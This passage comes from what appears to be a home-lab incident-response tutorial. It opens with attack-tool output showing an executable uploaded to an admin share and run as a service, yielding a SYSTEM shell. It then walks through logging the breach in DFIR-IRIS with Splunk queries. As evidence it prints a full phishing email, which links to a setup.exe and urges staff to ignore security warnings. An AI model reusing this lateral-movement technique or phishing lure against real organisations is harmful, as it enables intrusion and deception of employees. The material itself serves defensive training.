+<a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Found</span> <span class="n">writable</span> <span class="n">share</span> <span class="n">ADMIN</span><span class="err">$</span>
+<a id="__codelineno-29-6" name="__codelineno-29-6" href="#__codelineno-29-6"></a><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Uploading</span> <span class="n">file</span> <span class="n">DaZyEoxe</span><span class="o">.</span><span class="n">exe</span>
+<a id="__codelineno-29-7" name="__codelineno-29-7" href="#__codelineno-29-7"></a><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Opening</span> <span class="n">SVCManager</span> <span class="n">on</span> <span class="mf">10.0.0.140</span><span class="o">.....</span>
+<a id="__codelineno-29-8" name="__codelineno-29-8" href="#__codelineno-29-8"></a><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Creating</span> <span class="n">service</span> <span class="n">epJh</span> <span class="n">on</span> <span class="mf">10.0.0.140</span><span class="o">.....</span>
+<a id="__codelineno-29-9" name="__codelineno-29-9" href="#__codelineno-29-9"></a><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Starting</span> <span class="n">service</span> <span class="n">epJh</span><span class="o">.....</span>
+<a id="__codelineno-29-10" name="__codelineno-29-10" href="#__codelineno-29-10"></a><span class="p">[</span><span class="err">!</span><span class="p">]</span> <span class="n">Press</span> <span class="n">help</span> <span class="k">for</span> <span class="n">extra</span> <span class="n">shell</span> <span class="n">commands</span>
+<a id="__codelineno-29-11" name="__codelineno-29-11" href="#__codelineno-29-11"></a><span class="n">Microsoft</span> <span class="n">Windows</span> <span class="p">[</span><span class="n">Version</span> <span class="mf">10.0.17763.3650</span><span class="p">]</span>
+<a id="__codelineno-29-12" name="__codelineno-29-12" href="#__codelineno-29-12"></a><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="mi">2018</span> <span class="n">Microsoft</span> <span class="n">Corporation</span><span class="o">.</span> <span class="n">All</span> <span class="n">rights</span> <span class="n">reserved</span><span class="o">.</span>
+<a id="__codelineno-29-13" name="__codelineno-29-13" href="#__codelineno-29-13"></a>
+<a id="__codelineno-29-14" name="__codelineno-29-14" href="#__codelineno-29-14"></a><span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">system32</span><span class="o">&gt;</span> <span class="n">whoami</span>
+<a id="__codelineno-29-15" name="__codelineno-29-15" href="#__codelineno-29-15"></a><span class="n">nt</span> <span class="n">authority</span>\<span class="n">system</span>
+</code></pre></div>
+<h2 id="introduction-to-iris"><strong>Introduction to IRIS</strong></h2>
+<h3 id="adding-a-customer"><strong>Adding a Customer</strong></h3>
+<p>Upon entering the administrator credentials, the Dashboard highlights pending tasks and ongoing cases.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%204.png" data-desc-position="bottom"><img alt="image.png" src="image%204.png"></a></p>
+<p>To access the customer management page, open the sidebar menu, expand the <strong>Advanced</strong> section, and click on <strong>Customers</strong>.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%205.png" data-desc-position="bottom"><img alt="image.png" src="image%205.png"></a></p>
+<p>This displays a list of customers. To add a new customer, click <strong>Add Customer</strong> in the top-right corner of the window. In this window, we can input the customer's details. We'll name the customer <strong>cyber.local</strong> and add <strong>customer</strong> as a brief description. There's also an option to specify the Service-Level Agreement (SLA) with the customer, but since we don't have one in this instance, we'll leave it blank.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%206.png" data-desc-position="bottom"><img alt="image.png" src="image%206.png"></a></p>
+<p>Click <strong>Save</strong> to create the customer. Once saved, the new customer will appear in the list on the Customer Management page.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%207.png" data-desc-position="bottom"><img alt="image.png" src="image%207.png"></a></p>
+<h3 id="creating-a-case"><strong>Creating a Case</strong></h3>
+<p>Having logged into IRIS and created our customer, we can now begin the case management process. A case is the fundamental unit of an incident. It serves as a container for various elements used to organise information related to the incident.</p>
+<p>To create a new case, navigate to the dashboard and click <strong>Create new case</strong> in the top-right corner of the window. This opens a new page with several fields for entering details about the new case. </p>
+<p>For <strong>Customer</strong>, select <strong>cyber.local</strong>. For <strong>Case Name</strong>, enter <strong>[2024-12-16] Data Breach</strong>. The <strong>Select Case Template</strong> option allows us to choose a predefined template for the case. Templates can automatically populate various elements, such as tasks, tags, a case title prefix, and more. Since this step is optional, we’ll leave it blank.</p>
+<p>For <strong>Classification</strong>, select <strong>Information-Content-Security: Unauthorised Access to Information</strong>. For <strong>Short Description</strong>, enter <strong>Data breach from unauthorised SMB share access</strong>. </p>
+<p>The last field is the <strong>SOC Ticket ID</strong>. In many cases, incidents are monitored through a ticketing platform like Jira or ServiceNow. While we're not using a ticketing system for this example, this is where you would input the ticket ID if one were being used.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%208.png" data-desc-position="bottom"><img alt="image.png" src="image%208.png"></a></p>
+<p>After completing all the required fields, click <strong>Create</strong> to add the case. A pop-up will appear confirming that the case has been successfully created.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%209.png" data-desc-position="bottom"><img alt="image.png" src="image%209.png"></a></p>
+<p>With our new case created, we can return to the dashboard by clicking <strong>Go to Dashboard</strong> in the pop-up or selecting <strong>Dashboard</strong> from the sidebar menu.</p>
+<p>Our newly created case, titled <strong>#2 - [2024-12-16] Data Breach</strong>, appears under <strong>Attributed Open Cases</strong>. The prefix <strong>#2</strong> is automatically added to the case title, reflecting its sequence in the total number of cases created in the system.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2010.png" data-desc-position="bottom"><img alt="image.png" src="image%2010.png"></a></p>
+<p>By clicking on the case name, we are taken to the <strong>Summary</strong> tab for the case. This page offers a range of options for managing the case.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2011.png" data-desc-position="bottom"><img alt="image.png" src="image%2011.png"></a></p>
+<h3 id="adding-assets"><strong>Adding Assets</strong></h3>
+<p>During incident response, maintaining a list of assets that are known or suspected to be compromised is essential. To add an asset, go to the <strong>Assets</strong> tab on the case page. This will display the asset list, which is currently empty. To include a new asset, click the <strong>Add Assets</strong> button located in the top-right corner of the window.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2012.png" data-desc-position="bottom"><img alt="image.png" src="image%2012.png"></a></p>
+<p>For the first asset, enter the following details:</p>
+<ul>
+<li><strong>Asset Type:</strong> Select <strong>Windows - DC</strong>.</li>
+<li><strong>Asset Name:</strong> Enter <strong>WS2019</strong>.</li>
+<li><strong>Description:</strong> Add <strong>Windows Server 2019 Domain Controller</strong>.</li>
+<li><strong>Domain:</strong> Specify <strong>cyber.local</strong>.</li>
+<li><strong>IP:</strong> 10.0.0.140</li>
+<li><strong>Compromise Status:</strong> Choose <strong>Compromised</strong>.</li>
+<li><strong>Analysis Status:</strong> Set to <strong>Done</strong>, as the machine has been confirmed compromised and analysis is complete.</li>
+<li><strong>Tags:</strong> Add <strong>Windows</strong> and <strong>Domain Controller</strong>.</li>
+</ul>
+<p>Click <strong>Save</strong> in the lower right-hand corner of the window. </p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2013.png" data-desc-position="bottom"><img alt="image.png" src="image%2013.png"></a></p>
+<p>This creates the following entry in the list of assets:</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2014.png" data-desc-position="bottom"><img alt="image.png" src="image%2014.png"></a></p>
+<p>For the second asset, enter the following details:</p>
+<ul>
+<li><strong>Asset Type:</strong> Select <strong>Linux - Computer.</strong></li>
+<li><strong>Asset Name:</strong> Enter <strong>Splunk</strong>.</li>
+<li><strong>Description:</strong> Add <strong>A Linux computer running Splunk Enterprise.</strong></li>
+<li><strong>Domain:</strong> (Leave it blank)</li>
+<li><strong>IP:</strong> 10.0.0.120</li>
+<li><strong>Compromise Status:</strong> Choose <strong>Compromised</strong>.</li>
+<li><strong>Analysis Status:</strong> Set to <strong>Done</strong>, as the machine has been confirmed compromised and analysis is complete.</li>
+<li><strong>Tags:</strong> Add <strong>Linux</strong> and <strong>Splunk</strong>.</li>
+</ul>
+<p>Click <strong>Save</strong> in the lower right-hand corner of the window. </p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2015.png" data-desc-position="bottom"><img alt="image.png" src="image%2015.png"></a></p>
+<p>The new asset will now appear in the <strong>Assets</strong> tab list:</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2016.png" data-desc-position="bottom"><img alt="image.png" src="image%2016.png"></a></p>
+<p>Next, set asset details for the Domain account splunk:</p>
+<ul>
+<li><strong>Asset Type:</strong> Select <strong>Windows Account - AD</strong>.</li>
+<li><strong>Asset Name:</strong> Enter <strong>splunk</strong> (the username).</li>
+<li><strong>Description:</strong> Add <strong>Domain account</strong>.</li>
+<li><strong>Domain:</strong> Set to <strong>cyber.local</strong>.</li>
+<li><strong>Compromise Status:</strong> Choose <strong>Compromised</strong>.</li>
+<li><strong>Analysis Status:</strong> Select <strong>Done</strong>.</li>
+<li><strong>Tags:</strong> Add <strong>Windows</strong>, <strong>Active Directory</strong>, and <strong>Account</strong>.</li>
+</ul>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2017.png" data-desc-position="bottom"><img alt="image.png" src="image%2017.png"></a></p>
+<p>Click <strong>Save</strong> to finalise the entry. The new asset will now appear in the <strong>Assets</strong> tab list.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2018.png" data-desc-position="bottom"><img alt="image.png" src="image%2018.png"></a></p>
+<p>Next, set asset details for the Domain Administrator account:</p>
+<ul>
+<li><strong>Asset Type:</strong> Select <strong>Windows Account - AD - Admin.</strong></li>
+<li><strong>Asset Name:</strong> Enter <strong>Administrator</strong> (the username).</li>
+<li><strong>Description:</strong> Add <strong>Domain Administrator account</strong>.</li>
+<li><strong>Domain:</strong> Set to <strong>cyber.local</strong>.</li>
+<li><strong>Compromise Status:</strong> Choose <strong>Compromised</strong>.</li>
+<li><strong>Analysis Status:</strong> Select <strong>Done</strong>.</li>
+<li><strong>Tags:</strong> Add <strong>Windows</strong>, <strong>Active Directory</strong>, and <strong>Administrator Account</strong>.</li>
+</ul>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2019.png" data-desc-position="bottom"><img alt="image.png" src="image%2019.png"></a></p>
+<p>Click Save. Our list of assets in the case's <strong>Assets</strong> tab now contains a total of four entries.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2020.png" data-desc-position="bottom"><img alt="image.png" src="image%2020.png"></a></p>
+<h3 id="creating-a-timeline"><strong>Creating a Timeline</strong></h3>
+<p>In IRIS, we can create a timeline by adding individual events to document the sequence of actions and incidents.</p>
+<p>The first event is <strong>File Creation Event Detected for setup.exe on WS2019</strong>. To locate the log for this event, search the Splunk server using the following query:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="n">index</span><span class="o">=*</span> <span class="s2">"setup.exe"</span>
+</code></pre></div>
+<p>Set the timeframe to <strong>All time</strong> to ensure the event is captured.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2021.png" data-desc-position="bottom"><img alt="image.png" src="image%2021.png"></a></p>
+<p>To create an event for this in the timeline, navigate to the <strong>Timeline</strong> tab. Click <strong>Add event</strong> and enter the following details:</p>
+<ul>
+<li><strong>Title:</strong> File Creation Event Detected for setup.exe on WS2019</li>
+<li><strong>Time:</strong> 14/12/2024 12:16:54.000 AM with the UTC offset of +13:00.<ul>
+<li>The most widely used standard for recording time data is Coordinated Universal Time (UTC). In this case, we've included +13:00 as the UTC offset. This is because the Splunk server is configured to New Zealand time, which generally has a UTC offset of +13 hours during Daylight Saving Time.</li>
+</ul>
+</li>
+<li><strong>Description:</strong> The Firefox process created a file named setup.exe in the Administrator's Downloads folder on WS2019.</li>
+<li>
+<p><strong>Event Raw data:</strong> <snip><data name="Image">C:\Program Files\Mozilla Firefox\firefox.exe</data><data name="TargetFilename">C:\Users\Administrator\Downloads\setup.exe</data><snip></snip></snip></p>
+<ul>
+<li>To obtain raw event data, clicking the <strong>&gt;</strong> icon reveals the <strong>Event Actions</strong> dropdown. From the dropdown options, select <strong>Show Source</strong> to display the raw log.</li>
+<li>Selecting <strong>Show Source</strong> opens a new browser tab, highlighting the raw log entry. From there, we can copy the log and paste it into the <strong>raw event data</strong> field.</li>
+</ul>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2022.png" data-desc-position="bottom"><img alt="image.png" src="image%2022.png"></a></p>
+</li>
+<li>
+<p><strong>Event Source:</strong> Sysmon</p>
+</li>
+<li><strong>Event Tags:</strong> file creation, Firefox, setup.exe</li>
+<li><strong>Link to Assets:</strong> WS2019</li>
+<li><strong>Event Category:</strong> Initial Access</li>
+<li>Select <strong>Add to Summary</strong> to include the event in the timeline visualisation.</li>
+<li>Choose <strong>Display in Graph</strong> to add the event to the graph view.</li>
+<li>Use the <strong>red box</strong> to assign a colour to the event for easy identification.</li>
+<li>Save</li>
+</ul>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2023.png" data-desc-position="bottom"><img alt="image.png" src="image%2023.png"></a></p>
+<p>Upon saving, we are taken to the Timeline tab, where the event we just created is now visible.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2024.png" data-desc-position="bottom"><img alt="image.png" src="image%2024.png"></a></p>
+<p>The next event to document is <strong>Anonymous Login accessing C:\Shares on WS2019</strong>. To locate the log for this event, search the Splunk server using the following query:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="n">index</span><span class="o">=*</span> <span class="n">source</span><span class="o">=</span><span class="s2">"WinEventLog:Security"</span> <span class="s2">"EventCode=5140"</span> <span class="n">Account_Name</span><span class="o">=</span><span class="s2">"ANONYMOUS LOGON"</span>
+</code></pre></div>
+<p>Set the timeframe to <strong>All time</strong> to ensure the event is captured.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2025.png" data-desc-position="bottom"><img alt="image.png" src="image%2025.png"></a></p>
+<p>The log reveals that the event occurred at <strong>04:17:52.000 PM</strong>. Expanding the log by selecting <strong>Show all 31 lines</strong> provides additional details about the event, including the <strong>Share Path</strong>, which is listed as <strong>??\C:\Shares</strong>.
+Click <strong>Add event</strong> and enter the following details:</p>
+<ul>
+<li><strong>Title:</strong> Anonymous Login Accessed C:\Shares on WS2019</li>
+<li><strong>Time:</strong> 16/12/2024 04:17:52.000 PM with the UTC offset of&nbsp;+13:00.</li>
+<li><strong>Description:</strong> An anonymous login accessed the share path ??\C:\Shares on WS2019 from the source IP address 10.0.0.29. Accessed user_credentials.xlsx.</li>
+<li><strong>Event Raw data:</strong> 12/16/2024 04:17:52 PM LogName=Security EventCode=5140 EventType=0 ComputerName=WS2019.cyber.local <snip></snip></li>
+<li><strong>Event Source:</strong> Windows Event Log</li>
+<li><strong>Event tags:</strong> anonymous login, smb</li>
+<li><strong>Link to assets:</strong> WS2019</li>
+<li><strong>Event category:</strong> Initial Access</li>
+<li>Select <strong>Add to Summary</strong> to include the event in the timeline visualisation.</li>
+<li>Choose <strong>Display in Graph</strong> to add the event to the graph view.</li>
+<li>Use the <strong>orange box</strong> to assign a colour to the event for easy identification.</li>
+<li>Save</li>
+</ul>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2026.png" data-desc-position="bottom"><img alt="image.png" src="image%2026.png"></a></p>
+<p>After clicking <strong>Save</strong>, we are redirected to the <strong>Timeline</strong> tab, where our newly created event is now displayed.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2027.png" data-desc-position="bottom"><img alt="image.png" src="image%2027.png"></a></p>
+<p>The next event to document is <strong>Malicious Service Installed on WS2019</strong>. To locate the log for this event, search the Splunk server using the following query:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="n">index</span><span class="o">=*</span> <span class="n">EventCode</span><span class="o">=</span><span class="mi">7045</span>
+</code></pre></div>
+<p>Set the timeframe to <strong>All time</strong> to ensure the event is captured.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2028.png" data-desc-position="bottom"><img alt="image.png" src="image%2028.png"></a></p>
+<p>Click <strong>Add event</strong> and enter the following details:</p>
+<ul>
+<li><strong>Title:</strong> Malicious Service Installed on WS2019</li>
+<li><strong>Time:</strong> 16/12/2024 10:16:53.000 PM with the UTC offset of +13:00.</li>
+<li><strong>Description:</strong> A malicious service (LQEu) was installed on WS2019. The service runs under the LocalSystem account.</li>
+<li><strong>Event Raw data:</strong> 12/16/2024 10:16:53 PM LogName=System EventCode=7045 EventType=4 ComputerName=WS2019.cyber.local <snip></snip></li>
+<li><strong>Event Source:</strong> Windows Event Log</li>
+<li><strong>Event tags:</strong> malicious service</li>
+<li><strong>Link to assets:</strong> WS2019</li>
+<li><strong>Event category:</strong> Persistence</li>
+<li>Select <strong>Add to Summary</strong> to include the event in the timeline visualisation.</li>
+<li>Choose <strong>Display in Graph</strong> to add the event to the graph view.</li>
+<li>Use the <strong>green box</strong> to assign a colour to the event for easy identification.</li>
+<li>Save</li>
+</ul>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2029.png" data-desc-position="bottom"><img alt="image.png" src="image%2029.png"></a></p>
+<p>After saving, the <strong>Timeline</strong> tab displays the newly added event, bringing the total to three events.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2030.png" data-desc-position="bottom"><img alt="image.png" src="image%2030.png"></a></p>
+<h3 id="adding-evidence"><strong>Adding Evidence</strong></h3>
+<p>In incident response, evidence is crucial for verifying details such as the nature, origin, timing, and potential culprits behind an incident. In this instance, we’ll include the <code>.eml</code> file, which contains the original phishing email that delivered the <code>setup.exe</code> file laced with malware.
+The following is the content of our raw email:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="n">Delivered</span><span class="o">-</span><span class="n">To</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">SNIP</span><span class="o">&gt;</span><span class="nd">@gmail</span><span class="o">.</span><span class="n">com</span>
+<a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>
+<a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a><span class="n">Dear</span> <span class="n">staff</span><span class="p">,</span>
+<a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a>
+<a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a><span class="n">I</span> <span class="n">hope</span> <span class="n">this</span> <span class="n">email</span> <span class="n">finds</span> <span class="n">you</span> <span class="n">well</span><span class="o">.</span>
+<a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a>
+<a id="__codelineno-33-7" name="__codelineno-33-7" href="#__codelineno-33-7"></a><span class="n">Please</span> <span class="n">download</span> <span class="n">the</span> <span class="n">required</span> <span class="n">setup</span><span class="o">.</span><span class="n">exe</span> <span class="n">file</span> <span class="n">using</span> <span class="n">this</span> <span class="n">link</span>
+<a id="__codelineno-33-8" name="__codelineno-33-8" href="#__codelineno-33-8"></a><span class="o">&lt;</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.0.0.29</span><span class="o">/</span><span class="n">setup</span><span class="o">.</span><span class="n">exe</span><span class="o">&gt;</span> <span class="k">as</span> <span class="n">the</span> <span class="n">file</span> <span class="n">size</span> <span class="ow">is</span> <span class="n">too</span> <span class="n">large</span> <span class="n">to</span> <span class="n">attach</span> <span class="n">to</span>
+<a id="__codelineno-33-9" name="__codelineno-33-9" href="#__codelineno-33-9"></a><span class="n">this</span> <span class="n">email</span><span class="o">.</span>
+<a id="__codelineno-33-10" name="__codelineno-33-10" href="#__codelineno-33-10"></a>
+<a id="__codelineno-33-11" name="__codelineno-33-11" href="#__codelineno-33-11"></a><span class="n">Once</span> <span class="n">downloaded</span><span class="p">,</span> <span class="n">follow</span> <span class="n">these</span> <span class="n">steps</span> <span class="n">to</span> <span class="n">install</span><span class="p">:</span>
+<a id="__codelineno-33-12" name="__codelineno-33-12" href="#__codelineno-33-12"></a>
+<a id="__codelineno-33-13" name="__codelineno-33-13" href="#__codelineno-33-13"></a><span class="mf">1.</span> <span class="n">Save</span> <span class="n">the</span> <span class="n">file</span> <span class="n">to</span> <span class="n">your</span> <span class="n">computer</span><span class="o">.</span>
+<a id="__codelineno-33-14" name="__codelineno-33-14" href="#__codelineno-33-14"></a><span class="mf">2.</span> <span class="n">Double</span><span class="o">-</span><span class="n">click</span> <span class="n">the</span> <span class="n">downloaded</span> <span class="n">file</span> <span class="n">to</span> <span class="n">start</span> <span class="n">the</span> <span class="n">installation</span><span class="o">.</span>
+<a id="__codelineno-33-15" name="__codelineno-33-15" href="#__codelineno-33-15"></a><span class="mf">3.</span> <span class="n">Follow</span> <span class="n">the</span> <span class="n">on</span><span class="o">-</span><span class="n">screen</span> <span class="n">prompts</span> <span class="n">to</span> <span class="n">complete</span> <span class="n">the</span> <span class="n">setup</span><span class="o">.</span>
+<a id="__codelineno-33-16" name="__codelineno-33-16" href="#__codelineno-33-16"></a>
+<a id="__codelineno-33-17" name="__codelineno-33-17" href="#__codelineno-33-17"></a><span class="n">Please</span> <span class="n">note</span> <span class="n">that</span> <span class="n">some</span> <span class="n">security</span> <span class="n">warnings</span> <span class="n">might</span> <span class="n">appear</span> <span class="n">when</span> <span class="n">running</span> <span class="n">the</span> <span class="n">file</span><span class="o">.</span>
+<a id="__codelineno-33-18" name="__codelineno-33-18" href="#__codelineno-33-18"></a><span class="n">These</span> <span class="n">can</span> <span class="n">be</span> <span class="n">safely</span> <span class="n">ignored</span><span class="p">,</span> <span class="k">as</span> <span class="n">many</span> <span class="n">executable</span> <span class="n">files</span> <span class="n">are</span> <span class="n">flagged</span> <span class="k">as</span>
+<a id="__codelineno-33-19" name="__codelineno-33-19" href="#__codelineno-33-19"></a><span class="n">suspicious</span> <span class="n">by</span> <span class="n">default</span><span class="o">.</span>
+<a id="__codelineno-33-20" name="__codelineno-33-20" href="#__codelineno-33-20"></a>
+<a id="__codelineno-33-21" name="__codelineno-33-21" href="#__codelineno-33-21"></a><span class="n">If</span> <span class="n">you</span> <span class="n">experience</span> <span class="nb">any</span> <span class="n">issues</span> <span class="ow">or</span> <span class="n">have</span> <span class="n">questions</span><span class="p">,</span> <span class="n">feel</span> <span class="n">free</span> <span class="n">to</span> <span class="n">reach</span> <span class="n">out</span> <span class="n">to</span>
+<a id="__codelineno-33-22" name="__codelineno-33-22" href="#__codelineno-33-22"></a><span class="n">me</span> <span class="n">directly</span><span class="o">.</span>
+<a id="__codelineno-33-23" name="__codelineno-33-23" href="#__codelineno-33-23"></a>
+<a id="__codelineno-33-24" name="__codelineno-33-24" href="#__codelineno-33-24"></a><span class="n">Thank</span> <span class="n">you</span> <span class="k">for</span> <span class="n">your</span> <span class="n">cooperation</span><span class="o">.</span>
+<a id="__codelineno-33-25" name="__codelineno-33-25" href="#__codelineno-33-25"></a>
+<a id="__codelineno-33-26" name="__codelineno-33-26" href="#__codelineno-33-26"></a><span class="n">Best</span> <span class="n">regards</span><span class="p">,</span>
+<a id="__codelineno-33-27" name="__codelineno-33-27" href="#__codelineno-33-27"></a>
+<a id="__codelineno-33-28" name="__codelineno-33-28" href="#__codelineno-33-28"></a><span class="n">IT</span> <span class="n">helpdesk</span>
+<a id="__codelineno-33-29" name="__codelineno-33-29" href="#__codelineno-33-29"></a>
+<a id="__codelineno-33-30" name="__codelineno-33-30" href="#__codelineno-33-30"></a><span class="o">--</span><span class="mf">000000000000e1</span><span class="n">ecfe0629387b6c</span>
+<a id="__codelineno-33-31" name="__codelineno-33-31" href="#__codelineno-33-31"></a><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">;</span> <span class="n">charset</span><span class="o">=</span><span class="s2">"UTF-8"</span>
+<a id="__codelineno-33-32" name="__codelineno-33-32" href="#__codelineno-33-32"></a><span class="n">Content</span><span class="o">-</span><span class="n">Transfer</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span> <span class="n">quoted</span><span class="o">-</span><span class="n">printable</span>
+<a id="__codelineno-33-33" name="__codelineno-33-33" href="#__codelineno-33-33"></a>
+<a id="__codelineno-33-34" name="__codelineno-33-34" href="#__codelineno-33-34"></a><span class="o">&lt;</span><span class="n">div</span> <span class="nb">dir</span><span class="o">=</span><span class="mi">3</span><span class="n">D</span><span class="s2">"ltr"</span><span class="o">&gt;&lt;</span><span class="n">div</span><span class="o">&gt;&lt;</span><span class="n">div</span><span class="o">&gt;&lt;</span><span class="n">div</span><span class="o">&gt;&lt;</span><span class="n">div</span> <span class="nb">dir</span><span class="o">=</span><span class="mi">3</span><span class="n">D</span><span class="s2">"auto"</span><span class="o">&gt;&lt;</span><span class="n">div</span><span class="o">&gt;&lt;</span><span class="n">div</span><span class="o">&gt;&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">Dear</span> <span class="n">staff</span><span class="p">,</span><span class="o">&lt;=</span>
+<a id="__codelineno-33-35" name="__codelineno-33-35" href="#__codelineno-33-35"></a><span class="o">/</span><span class="n">p</span><span class="o">&gt;&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">I</span> <span class="n">hope</span> <span class="n">this</span> <span class="n">email</span> <span class="n">finds</span> <span class="n">you</span> <span class="n">well</span><span class="o">.&lt;</span><span class="n">br</span><span class="o">&gt;&lt;</span><span class="n">br</span><span class="o">&gt;</span><span class="n">Please</span> <span class="n">download</span> <span class="n">the</span> <span class="n">required</span><span class="o">=</span>
+<a id="__codelineno-33-36" name="__codelineno-33-36" href="#__codelineno-33-36"></a> <span class="n">setup</span><span class="o">.</span><span class="n">exe</span> <span class="n">file</span> <span class="n">using</span> <span class="n">this</span> <span class="o">&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="mi">3</span><span class="n">D</span><span class="s2">"http://10.0.0.29/setup.exe"</span><span class="o">&gt;</span><span class="n">link</span><span class="o">&lt;/</span><span class="n">a</span><span class="o">&gt;</span> <span class="o">=</span>
+<a id="__codelineno-33-37" name="__codelineno-33-37" href="#__codelineno-33-37"></a><span class="k">as</span> <span class="n">the</span> <span class="n">file</span> <span class="n">size</span> <span class="ow">is</span> <span class="n">too</span> <span class="n">large</span> <span class="n">to</span> <span class="n">attach</span> <span class="n">to</span> <span class="n">this</span> <span class="n">email</span><span class="o">.&lt;</span><span class="n">br</span><span class="o">&gt;&lt;</span><span class="n">br</span><span class="o">&gt;</span><span class="n">Once</span> <span class="n">download</span><span class="o">=</span>
+<a id="__codelineno-33-38" name="__codelineno-33-38" href="#__codelineno-33-38"></a><span class="n">ed</span><span class="p">,</span> <span class="n">follow</span> <span class="n">these</span> <span class="n">steps</span> <span class="n">to</span> <span class="n">install</span><span class="p">:</span><span class="o">&lt;</span><span class="n">br</span><span class="o">&gt;&lt;</span><span class="n">br</span><span class="o">&gt;</span><span class="mf">1.</span> <span class="n">Save</span> <span class="n">the</span> <span class="n">file</span> <span class="n">to</span> <span class="n">your</span> <span class="n">computer</span><span class="o">=</span>
+<a id="__codelineno-33-39" name="__codelineno-33-39" href="#__codelineno-33-39"></a><span class="o">.&lt;</span><span class="n">br</span><span class="o">&gt;</span><span class="mf">2.</span> <span class="n">Double</span><span class="o">-</span><span class="n">click</span> <span class="n">the</span> <span class="n">downloaded</span> <span class="n">file</span> <span class="n">to</span> <span class="n">start</span> <span class="n">the</span> <span class="n">installation</span><span class="o">.&lt;</span><span class="n">br</span><span class="o">&gt;</span><span class="mf">3.</span> <span class="n">F</span><span class="o">=</span>
+<a id="__codelineno-33-40" name="__codelineno-33-40" href="#__codelineno-33-40"></a><span class="n">ollow</span> <span class="n">the</span> <span class="n">on</span><span class="o">-</span><span class="n">screen</span> <span class="n">prompts</span> <span class="n">to</span> <span class="n">complete</span> <span class="n">the</span> <span class="n">setup</span><span class="o">.&lt;</span><span class="n">br</span><span class="o">&gt;&lt;</span><span class="n">br</span><span class="o">&gt;</span><span class="n">Please</span>
+<a id="__codelineno-33-41" name="__codelineno-33-41" href="#__codelineno-33-41"></a> <span class="n">note</span> <span class="n">that</span> <span class="n">some</span> <span class="n">security</span> <span class="n">warnings</span> <span class="n">might</span> <span class="n">appear</span> <span class="n">when</span> <span class="n">running</span> <span class="n">the</span> <span class="n">file</span><span class="o">.=</span><span class="mi">20</span>
+<a id="__codelineno-33-42" name="__codelineno-33-42" href="#__codelineno-33-42"></a><span class="n">These</span> <span class="n">can</span> <span class="n">be</span> <span class="n">safely</span> <span class="n">ignored</span><span class="p">,</span> <span class="k">as</span> <span class="n">many</span> <span class="n">executable</span> <span class="n">files</span> <span class="n">are</span> <span class="n">flagged</span> <span class="k">as</span><span class="o">=</span><span class="mi">20</span>
